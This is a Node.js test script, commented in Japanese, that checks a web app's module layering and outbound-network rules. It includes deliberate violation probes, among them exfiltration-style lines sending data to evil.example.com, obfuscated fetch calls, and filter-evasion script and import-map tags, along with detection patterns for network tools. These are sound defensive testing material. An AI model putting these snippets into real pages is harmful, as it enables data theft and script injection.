// 役割の決まり（spec/architecture.md の表 1）を検査する。
// 1. 表のパスが全部あり、空でない。js/ の下のファイルは全部どこかの役割に入っている
// 2. shared と core は、画面・保存・通信・時計・乱数を使わない
// 3. 外へ通信する fetch は js/ai-reader.js だけ。ほかの通信の道具と、外の URL を文字で書くことは全部の js で禁止
// 4. shared は core と adapter を使わず、core は adapter を使わない（adapter の名前は adapter のファイルから拾う）
// 5. AI の読み取りには見本（Fake）がある
// 6. entry と adapter は HTML の文字列を直接入れない（innerHTML など）
// 7. この検査自身が、わざと違反を入れた見本で落ちる（何も検査していないのに通る、を防ぐ）
// 8. HTML と CSS から外を読むのは、表「外から読む先」にそのファイルの先として書いた所だけ。外のスクリプトと読み込む link には integrity。
//    js の import は importmap で URL に直して、1 つずつ integrity（中身は test/outside.mjs）
// 決まりを外すときは、その行に「// arch-allow: 理由」を書く。外した数を毎回出す。
// 実行: node test/arch.check.mjs
import { readFileSync, existsSync, readdirSync } from 'node:fs';
import { allowTable, tableProblems, fileProblems, unusedAllows, importmapOf, importProblems } from './outside.mjs';

const root = new URL('../', import.meta.url);
const read = (p) => readFileSync(new URL(p, root), 'utf8');

const doc = read('spec/architecture.md');
const section = doc.slice(doc.indexOf('## 1.'), doc.indexOf('## 2.'));
const roles = Object.fromEntries(section.split('\n').filter(l => /^\| (shared|core|adapter|entry) \|/.test(l)).map(l => {
  const [, role, paths] = l.split('|').map(s => s.trim());
  return [role, paths.split(/\s+/).filter(Boolean)];
}));

const problems = [];
let allowed = 0;
const fail = (msg) => problems.push(msg);

['shared', 'core', 'adapter', 'entry'].forEach(r => { if (!roles[r] || !roles[r].length) fail(`表 1 に ${r} の行が無い`); });
Object.values(roles).flat().forEach(p => {
  if (!existsSync(new URL(p, root))) fail(`表のパスが無い: ${p}`);
  else if (!read(p).trim()) fail(`表のパスが空: ${p}`);
});
const jsFiles = readdirSync(new URL('js/', root)).filter(f => f.endsWith('.js')).map(f => `js/${f}`);
const listed = new Set(Object.values(roles).flat());
jsFiles.filter(f => !listed.has(f)).forEach(f => fail(`表 1 に無い js: ${f}`));

/* R に足す名前: 「R.x =」と、core.js の「window.REDUX = { … }」の 1 段目の名前 */
function namesOf(role) {
  const names = new Set();
  (roles[role] || []).filter(p => p.endsWith('.js') && existsSync(new URL(p, root))).forEach(p => {
    const src = read(p);
    for (const m of src.matchAll(/\bR\.(\w+)\s*=/g)) names.add(m[1]);
    const block = src.match(/window\.REDUX\s*=\s*\{([\s\S]*?)\n {2}\};/);
    if (block) for (const m of block[1].matchAll(/^ {4}(\w+)\s*(?::|,|\(|$)/gm)) names.add(m[1]);
  });
  return [...names];
}
const ADAPTER = namesOf('adapter');
const CORE = namesOf('core');
if (ADAPTER.length < 5) fail(`adapter の名前を拾えていない (${ADAPTER.length} 個)`);
if (CORE.length < 2) fail(`core の名前を拾えていない (${CORE.length} 個)`);

const PURE_BAN = [
  [/\bdocument\b/, '画面 (document)'], [/\bwindow\b/, 'window'], [/localStorage|sessionStorage|indexedDB/, '保存'],
  [/\bfetch\b|XMLHttpRequest|WebSocket|EventSource/, '通信'], [/\bnavigator\b/, 'navigator'],
  [/\bDate\b|performance\.now|Intl\.DateTimeFormat|\bTemporal\b/, '時計'], [/Math\.random|\bcrypto\b/, '乱数'], [/\bprocess\b/, '環境変数'],
  [/\bglobalThis\s*\??\.?\s*\[/, 'globalThis[…] (文字の名前で外のものを引く)'],
  [/\beval\b|\bFunction\s*\(|\bReflect\s*\.|\bself\b/, 'eval / Function / Reflect / self (文字の名前で外のものを引く)'],
  [/['"`](?:Date|fetch|localStorage|sessionStorage|indexedDB|document|window|navigator|performance|crypto|process|XMLHttpRequest|WebSocket|EventSource|Temporal)['"`]/,
    '外のものの名前を文字で書いている', true]
];
const DOT = '\\s*\\??\\.\\s*';                                         // R.x / R?.x / R .x
const HUB = `(?:R|globalThis${DOT}REDUX|window${DOT}REDUX)`;
const usesNames = (names, what) => [
  [new RegExp(`\\b${HUB}${DOT}(${names.join('|')})\\b`), what],
  [new RegExp(`\\b${HUB}\\s*(?:\\?\\.)?\\s*\\[\\s*['"\`](${names.join('|')})['"\`]\\s*\\]`), what, true]
];
/* 分割代入（const { aiReader } = R）は複数行にまたがり、入れ子（{ aiReader: { read } }）もありうるので、ファイル全体で全件見る */
const BRACE = '(?:[^{}]|\\{[^{}]*\\})*';
const destructures = (names, what) => [new RegExp(`\\{${BRACE}\\b(${names.join('|')})\\b${BRACE}\\}\\s*=\\s*${HUB}\\b`, 'g'), what, true];
const rulesFor = {
  shared: { line: [...PURE_BAN, ...usesNames(ADAPTER, 'adapter'), ...usesNames(CORE, 'core')],
    file: [destructures(ADAPTER, 'adapter'), destructures(CORE, 'core')] },
  core: { line: [...PURE_BAN, ...usesNames(ADAPTER, 'adapter')], file: [destructures(ADAPTER, 'adapter')] }
};
const HTML_BAN = { line: [[/\.(innerHTML|outerHTML)\s*\+?=|insertAdjacentHTML|document\.write/, 'HTML の文字列を直接入れている'],
  [/\[\s*['"`](?:innerHTML|outerHTML|insertAdjacentHTML)['"`]\s*\]/, 'HTML の文字列を直接入れている', true]], file: [] };
/* 外への通信。fetch は ( が無くても（const f = fetch）見る。読み込むタグを作る・外の URL を書くのは、文字列の中身を残した方で見る */
const NET_TOOLS = [
  [/\bimport\s*\(/, '動的な import'],
  [/\bsendBeacon\b|\bXMLHttpRequest\b|\bWebSocket\b|\bEventSource\b|\bnew\s+(?:Shared)?Worker\b|\bimportScripts\b/, '外への通信の道具'],
  [/createElement(?:NS)?\s*\(\s*(?:[^,)]*,\s*)?['"`](?:script|link|iframe|frame|object|embed)['"`]/i, '読み込むタグを作っている', true],
  [/\bel\s*\(\s*['"`](?:script|link|iframe|frame|object|embed)['"`]/i, '読み込むタグを作っている', true],
  /* 文字列の頭の // と、ソースで \\\\ と書いた物（文字としては \\。ブラウザは // と同じに読む）。正規表現の '\\b' は外さない */
  [/['"`]\s*(?:[a-z][a-z0-9+.-]*:)?(?:\/\/|\\{4})[^\s'"`]/i, '外の URL を文字で書いている', true],
  [/\b(?:https?|wss?|ftp):[\\/]{2}/i, '外の URL を文字で書いている', true],
  /* 文字を組み立てて名前を作る形（window['fe' + 'tch']）は、上の禁止を素通りするので、引く道具ごと禁止する */
  [/\b(?:window|globalThis|self)\s*\??\.?\s*\[/, '文字の名前で外のものを引いている'],
  [/\beval\b|\bFunction\s*\(/, 'eval / Function']
];
const NET_BAN = { line: [[/\bfetch\b/, '外への通信 fetch (ai-reader.js 以外)'], ...NET_TOOLS], file: [] };
const AI_READER_BAN = { line: NET_TOOLS, file: [] };

/* コメントを消す。文字列・テンプレート文字列（複数行も）・正規表現の中の // と /* は残す。\ の次の 1 字は読み飛ばす。
   blankStrings のときは文字列の中身も空白にする（見本メールの「Date of birth」を時計と見なさないため）。
   テンプレート文字列の ${ … } の中はコードとして読む。
   / が正規表現の始まりかは、直前の文字で決める（( , = : [ ! & | ? { } ; + - * % < > ~ ^ の後か、行の頭か、return などの後） */
const REGEX_AFTER = /(^|[(,=:[!&|?{};+\-*%<>~^]|\b(return|typeof|case|in|of))\s*$/;
function stripComments(src, blankStrings) {
  let inBlock = false;
  let quote = null;
  const depth = [];   // ${ … } の中の { の深さ。0 の } でテンプレート文字列に戻る
  return src.split('\n').map(line => {
    let out = '';
    if (quote === "'" || quote === '"') quote = null;   // 普通の文字列は行をまたがない
    let regex = false;
    let klass = false;
    for (let i = 0; i < line.length; i += 1) {
      const c = line[i];
      const n = line[i + 1];
      if (inBlock) { if (c === '*' && n === '/') { inBlock = false; i += 1; out += '  '; } else out += ' '; continue; }
      if (c === '\\') { out += quote && blankStrings ? '  ' : c + (n || ''); i += 1; continue; }
      if (quote) {
        if (quote === '`' && c === '$' && n === '{') { depth.push(0); quote = null; out += '${'; i += 1; continue; }
        if (c === quote) { quote = null; out += c; } else out += blankStrings ? ' ' : c;
        continue;
      }
      if (depth.length && c === '{') depth[depth.length - 1] += 1;
      if (depth.length && c === '}') {
        if (depth[depth.length - 1] === 0) { depth.pop(); quote = '`'; out += c; continue; }
        depth[depth.length - 1] -= 1;
      }
      if (regex) {
        out += c;
        if (c === '[') klass = true;
        else if (c === ']') klass = false;
        else if (c === '/' && !klass) regex = false;
        continue;
      }
      if (c === '/' && n === '/') break;
      if (c === '/' && n === '*') { inBlock = true; i += 1; out += '  '; continue; }
      if (c === '/' && REGEX_AFTER.test(out)) { regex = true; out += c; continue; }
      if (c === "'" || c === '"' || c === '`') quote = c;
      out += c;
    }
    return out;
  });
}

/* 規則の 3 つ目が true なら、文字列の中身を残した方で見る（R['aiReader'] のため）。ほかは中身を空白にした方で見る */
function violations(src, rules) {
  const raw = src.split('\n');
  const code = stripComments(src, true);
  const keep = stripComments(src, false);
  const out = [];
  const hit = (line, what) => {
    if (/\/\/ arch-allow: \S/.test(raw[line] || '')) { allowed += 1; return; }
    out.push({ line: line + 1, what });
  };
  rules.line.forEach(([re, what, keepStrings]) => {
    (keepStrings ? keep : code).forEach((c, i) => { if (re.test(c)) hit(i, what); });
  });
  rules.file.forEach(([re, what, keepStrings]) => {
    const joined = (keepStrings ? keep : code).join('\n');
    for (const m of joined.matchAll(re)) hit(joined.slice(0, m.index).split('\n').length - 1, what);
  });
  return out;
}

['shared', 'core'].forEach(role => (roles[role] || []).forEach(p => {
  violations(read(p), rulesFor[role]).forEach(v => fail(`${p}:${v.line} ${v.what} を使っている`));
}));
jsFiles.forEach(p => {
  violations(read(p), p === 'js/ai-reader.js' ? AI_READER_BAN : NET_BAN).forEach(v => fail(`${p}:${v.line} ${v.what}`));
});
[...(roles.entry || []), ...(roles.adapter || [])].filter(p => p.endsWith('.js')).forEach(p => {
  violations(read(p), HTML_BAN).forEach(v => fail(`${p}:${v.line} ${v.what}`));
});
if (!/function readSample\(/.test(read('js/ai-reader.js'))) fail('js/ai-reader.js に見本 (readSample) が無い');

/* 8. 外から読む先。許可は spec の表「外から読む先」だけから、ファイルごとに読む */
const ALLOW = allowTable(doc);
if (!ALLOW || !Object.keys(ALLOW).length) fail('spec/architecture.md に表「外から読む先」が無い（検査が何も見ていない）');
tableProblems(ALLOW).forEach(fail);
const htmlFiles = readdirSync(new URL('./', root)).filter(f => f.endsWith('.html') && !f.endsWith('.local.html'));
const cssFiles = readdirSync(new URL('css/', root)).filter(f => f.endsWith('.css')).map(f => `css/${f}`);
if (!htmlFiles.length) fail('検査する HTML が無い');
[...htmlFiles, ...cssFiles].forEach(f => {
  const rule = ALLOW && ALLOW[f];
  if (!rule) { fail(`表「外から読む先」に ${f} の行が無い`); return; }
  const text = read(f);
  fileProblems(text, rule, f.endsWith('.html')).forEach(v => fail(`${f}: ${v}`));
  unusedAllows(text, rule).forEach(v => fail(`${f}: 表で許しているのに使っていない: ${v}`));
});
Object.keys(ALLOW || {}).filter(f => !existsSync(new URL(f, root))).forEach(f => fail(`表「外から読む先」のファイルが無い: ${f}`));
const MAP = importmapOf(htmlFiles.map(read).join('\n'));
const codeOf = (src) => stripComments(src, false).join('\n');
jsFiles.forEach(p => importProblems(codeOf(read(p)), MAP).forEach(v => fail(`${p}: ${v}`)));

/* 7. わざと違反を入れた見本。どれか 1 つでも見逃したら、この検査が甘い */
const PROBES = [
  [rulesFor.core, 'const x = Date.now();'], [rulesFor.core, 'const d = new Date;'], [rulesFor.core, 'const d = Date();'],
  [rulesFor.core, 'const t = performance.now();'], [rulesFor.core, 'const f = new Intl.DateTimeFormat().format();'],
  [rulesFor.core, 'const id = crypto.randomUUID();'], [rulesFor.core, 'const r = Math.random();'],
  [rulesFor.core, 'const id = R.newId();'], [rulesFor.core, 'const d = R.today();'],
  [rulesFor.core, 'const { aiReader } = R;'], [rulesFor.core, 'const {\n  aiReader\n} = R;'],
  [rulesFor.core, 'const r = globalThis.REDUX.aiReader;'], [rulesFor.core, "const r = R['aiReader'];"],
  [rulesFor.core, "const u = 'https://x'; fetch(u);"], [rulesFor.core, "const s = 'x //'; const t = Date.now();"],
  [rulesFor.core, 'document.title = 1;'], [rulesFor.core, 'const k = process.env.KEY;'],
  [rulesFor.core, 'const r = R?.aiReader;'], [rulesFor.core, 'const r = R .aiReader;'], [rulesFor.core, "const r = R?.['aiReader'];"],
  [rulesFor.core, 'const { aiReader: { read } } = R;'], [rulesFor.core, 'const { aiReader = {} } = R;'],
  [rulesFor.core, 'const { aiReader } = R; // arch-allow: probe\nconst { aiReader: a2 } = R;'],
  [rulesFor.core, 'const n = Temporal.Now.instant();'], [rulesFor.core, 'const re = /[/*]/; const t = Date.now();'],
  [rulesFor.core, 'const s = `x\nhttp://y`; const t = Date.now();'], [rulesFor.core, 'const q = a.replace(/\\//g, "_"); const t = Date.now();'],
  [rulesFor.shared, 'const h = R.rosterCore.status(p);'], [rulesFor.shared, 'const r = R.healthRedact.redact(t);'],
  [HTML_BAN, 'box.innerHTML = name;'], [HTML_BAN, 'el.insertAdjacentHTML("beforeend", x);'], [HTML_BAN, 'document.write(x);'], [HTML_BAN, "box['innerHTML'] = x;"]
];
PROBES.push([rulesFor.core, 'const s = `${Date.now()}`;'], [rulesFor.core, "const f = globalThis['fetch'];"],
  [rulesFor.core, "const f = self['fetch'];"], [rulesFor.core, "const t = Function('return 1')();"], [rulesFor.core, "eval('x');"],
  [rulesFor.core, "const d = Reflect.get(globalThis, 'x');"], [rulesFor.core, "const g = globalThis; const d = g['Date'];"],
  [rulesFor.core, "const { ['aiReader']: a } = R;"],
  [rulesFor.core, 'const s = `a\n${R.today()}\nb`;']);
/* 文字列の中に言葉があるだけなら通る（見本のメールの文面など） */
const CLEAN = ['const s = "Date of birth";', "const u = 'window.document and fetch(x)';", 'const t = `Date: ${n}`;'];
const before = allowed;
PROBES.forEach(([rules, code]) => { if (!violations(code, rules).length) fail(`検査が甘い: 「${code.replace(/\n/g, ' ')}」を見逃した`); });
/* 8 番の見本（ジンとザクのレビューで見逃した書き方）。[許可の行, 中身, HTML か] */
const NONE = { allow: [], bare: [] };
const IDX = (ALLOW && ALLOW['index.html']) || NONE;
const QR = 'https://cdnjs.cloudflare.com/ajax/libs/qrcode-generator/1.4.4/';
const TJS = 'https://cdn.jsdelivr.net/npm/three@0.160.0/';
const FILE_PROBES = [
  [NONE, '<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=BIZ+UDPGothic">', true],
  [IDX, '<script src=https://evil.example.com/x.js></script>', true],
  [IDX, '<SCRIPT SRC="HTTPS://evil.example.com/x.js"></SCRIPT>', true],
  [IDX, '<script src="//evil.example.com/x.js"></script>', true],
  [IDX, `<script src="${QR}x.js" data-integrity="sha512-x" crossorigin="anonymous"></script>`, true],
  [IDX, `<script title="a>b integrity='sha512-x'" src="${QR}x.js"></script>`, true],
  [IDX, `<link rel="modulepreload" href="${TJS}build/three.module.js">`, true],
  [IDX, `<link rel="stylesheet" href="${TJS}x.css">`, true],
  [IDX, `<base href="${TJS}">`, true],
  [IDX, '<img srcset="https://evil.example.com/a.png 1x">', true],
  [IDX, `<script type="module">import "${TJS}x.js";</script>`, true],
  [IDX, '<script type=importmap>{ "imports": { "a": "https://evil.example.com/a.js" } }</script>', true],
  [IDX, `<script type=" IMPORTMAP ">{ "imports": { "a": "${TJS}a.js" } }</script>`, true],
  [IDX, `<script type="importmap">{ "imports": {}, "scopes": { "/js/": { "three": "${TJS}t.js" } } }</script>`, true],
  [IDX, '<style>@import "https://evil.example.com/a.css";</style>', true],
  [IDX, '<div style="background:url(//evil.example.com/p.png)"></div>', true],
  [IDX, '<meta http-equiv="refresh" content="0;url=https://evil.example.com/">', true],
  [IDX, '<script src="https&#58;//evil.example.com/x.js"></script>', true],
  [IDX, '<script src="ht&#x9;tps://evil.example.com/x.js"></script>', true],
  [IDX, '<script src="\\\\evil.example.com/x.js"></script>', true],
  [IDX, `<script src="${TJS}../evil@1/x.js" integrity="sha512-x"></script>`, true],
  [IDX, `<!-- <a title="x --><script src="${QR}x.js"></script>`, true],
  [IDX, `<svg><script href="${QR}x.js"></script></svg>`, true],
  [IDX, "<script type=\"module\">import { OrbitControls } from 'three/addons/controls/OrbitControls.js';</script>", true],
  [IDX, "<script>fetch(atob('aHR0cHM6Ly9ldmlsLmV4YW1wbGUuY29t'))</script>", true],
  [IDX, '<img src="assets/x.png" onerror="navigator.sendBeacon(u, d)">', true],
  [IDX, '<a href="javascript:void(0)">x</a>', true],
  [IDX, '<script src="data:text/javascript;base64,ZmV0Y2goKQ==" integrity="sha256-AAAA"></script>', true],
  [IDX, '<img src="https:/&#9;/evil.example.com/p.png">', true],
  [IDX, '<img src="https:/\t/evil.example.com/p.png">', true],
  [IDX, "<style>.a{background:url('https:\\2f\\2f evil.example.com/p.png')}</style>", true],
  [NONE, '@import url("https://fonts.googleapis.com/css2?family=X");', false],
  [NONE, '.a{background:url(//evil.example.com/p.png)}', false]
];
const FILE_CLEAN = [
  [IDX, `<script src="${QR}x.js" integrity="sha512-x" crossorigin="anonymous"></script><link rel="stylesheet" href="css/fonts.css">`, true],
  [NONE, '<img src="https:/evil.example.com/p.png">', true],   /* https のページでは自分のサイトのパスになる（外ではない） */
  [NONE, '<a href="index.html">x</a><script src="js/app.js"></script><svg xmlns="http://www.w3.org/2000/svg"></svg>', true],
  [NONE, '.a{background:url(assets/x.png)}', false]
];
const NET_PROBES = ['import("https://evil.example.com/x.js");', "const x = '\\\\\\\\evil.example.com/a';", "el('script', { src: u });", "new Image().src = 'https://evil.example.com/p?d=' + d;",
  'navigator.sendBeacon(u, d);', 'const f = fetch; f(u);', 'fetch\n(u);', "document.createElement('iframe');", 'const w = new Worker(u);',
  'const s = new WebSocket(u);', "const x = '//evil.example.com/a';", 'const x = "wss://evil.example.com/a";', 'importScripts(u);',
  "window['fe' + 'tch'](u);", "Function('return 1')();"];
const NET_CLEAN = ["const s = 'a//b'; const u = '/api/read'; const p = x.split('//');", "const re = new RegExp('\\\\b(?:cold)\\\\b'); const e = s.replace(r, '\\\\$&');", "el('button', { type: 'button' });", 'const prefetch = 1;'];
const IMPORT_PROBES = ["import { OrbitControls } from 'three/addons/controls/OrbitControls.js';", "import x from 'lodash';",
  "export * from 'https://evil.example.com/x.js';"];
const IMPORT_CLEAN = "import * as THREE from 'three';\nimport { GLTFLoader } from 'three/addons/loaders/GLTFLoader.js';\nimport { a } from './a.js';";
const TABLE_PROBES = [{ 'a.html': { allow: ['https://cdn.jsdelivr.net'], bare: [] } }, { 'a.html': { allow: ['https://a.example.com/x/'], bare: ['https://b.example.com/'] } },
  { 'a.html': { allow: ['http://a.example.com/'], bare: [] } }];
const probeCount = FILE_PROBES.length + NET_PROBES.length + IMPORT_PROBES.length + TABLE_PROBES.length;
TABLE_PROBES.forEach(t => { if (!tableProblems(t).length) fail(`検査が甘い: 表の書き方 ${JSON.stringify(t)} を見逃した`); });
FILE_PROBES.forEach(([rule, text, isHtml]) => { if (!fileProblems(text, rule, isHtml).length) fail(`検査が甘い: 「${text.slice(0, 70)}」を見逃した`); });
FILE_CLEAN.forEach(([rule, text, isHtml]) => { const v = fileProblems(text, rule, isHtml); if (v.length) fail(`検査が厳しすぎる: 「${text.slice(0, 50)}」→ ${v[0]}`); });
NET_PROBES.forEach(code => { if (!violations(code, NET_BAN).length) fail(`検査が甘い: 「${code.replace(/\n/g, ' ')}」を見逃した`); });
NET_CLEAN.forEach(code => { if (violations(code, NET_BAN).length) fail(`検査が厳しすぎる: 「${code}」を違反と見た`); });
IMPORT_PROBES.forEach(code => { if (!importProblems(code, MAP).length) fail(`検査が甘い: 「${code}」を見逃した`); });
if (importProblems(IMPORT_CLEAN, MAP).length) fail(`検査が厳しすぎる: ${importProblems(IMPORT_CLEAN, MAP)[0]}`);
CLEAN.forEach(code => { if (violations(code, rulesFor.core).length) fail(`検査が厳しすぎる: 「${code}」を違反と見た`); });
allowed = before;

console.log(`files: shared ${roles.shared?.length || 0} / core ${roles.core?.length || 0} / adapter ${roles.adapter?.length || 0} / entry ${roles.entry?.length || 0}`);
console.log(`names: adapter ${ADAPTER.length} / core ${CORE.length} / probes: ${PROBES.length} + outside ${probeCount} / arch-allow: ${allowed}`);
console.log(`outside: ${Object.entries(ALLOW || {}).map(([f, r]) => `${f} ${r.allow.length}`).join(' / ')}`);
if (problems.length) {
  problems.forEach(p => console.log(`FAIL ${p}`));
  process.exit(1);
}
console.log('ok   architecture');
